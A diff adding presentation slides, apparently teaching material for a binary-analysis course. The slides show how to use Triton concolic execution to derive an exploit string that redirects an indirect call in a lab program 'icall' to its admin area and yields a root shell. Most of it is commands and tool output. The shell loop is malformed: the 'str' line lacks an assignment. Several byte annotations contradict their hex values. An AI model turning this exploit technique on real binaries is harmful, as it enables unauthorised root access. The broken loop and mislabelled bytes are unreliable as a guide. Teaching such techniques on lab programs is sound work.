@@ -422,3 +422,77 @@ We use **Concolic Execution** here because:
 - 2 goals(constraints):
   - register (of `call`) : `target`(start of admin area)
   - register value : printable ASCII character
+
+---
+
+# Exploiting a Vulnerability - `getting a root shell`
+
+```sh
+$ cd ~/triton/pin-2.14-71313-gcc.4.4.7-linux/source/tools/Triton/build
+$ ./triton ~/code/chapter13/exploit_callsite.py \
+           ~/code/chapter13/icall 2 AAA
+Symbolized argument 2: AAA
+Symbolized argument 1: 2
+Calling 0x223c625e
+Found tainted indirect call site '0x400bef: call rax'
+Getting model for 0x400bef: call rax -> 0x400b3b
+# no model found
+```
+
+1. Move to the directory which contains `triton`.
+2. Start `triton` script.
+   - Start `icall` in `Pin` using `exploit_callsite.py` as a Pin tool.
+   - `AAA` is arbitary string which is needed to drive program.
+3. No model was found which mean no 3-length string was fond.
+   - Recall that each inputs is symbolized in byte granularity.
+
+---
+
+# Exploiting a Vulnerability - getting a root shell
+
+Try input strings of length 1,2,...,100.
+
+```sh
+for i in $(seq 1 100); do
+  str`python -c "print 'A'*"${i}`  # str = "A" * i
+  echo "Trying input len ${i}"
+  ./triton ~/code/chapter13/exploit_callsite.py \
+         ~/code/chapter13/icall 2 ${str} \
+  | grep -a SymVar
+done
+```
+
+---
+
+# Exploiting a Vulnerability - getting a root shell
+
+Result is...
+
+```shell
+...
+Trying input len 4
+SymVar_0 = 0x24 (argv[2][0])  # $
+SymVar_1 = 0x2A (argv[2][1])  # *
+SymVar_2 = 0x58 (argv[2][2])  # X
+SymVar_3 = 0x26 (argv[2][3])  # &
+SymVar_4 = 0x40 (argv[2][4])  # last should be terminating NULL of the input
+SymVar_5 = 0x20 (argv[1][0])  # 2
+SymVar_6 = 0x40 (argv[1][1])  # last should be terminating NULL of the input
+...
+```
+
+- Exploit string is `$*X&`.
+
+---
+
+# Exploiting a Vulnerability - getting a root shell
+
+Get the root.
+
+```sh
+$ cd ~/code/chapter13
+$ ./icall 2 '$*X&'
+Calling 0x400b3b  # start of admin area
+# whoami
+root
+```
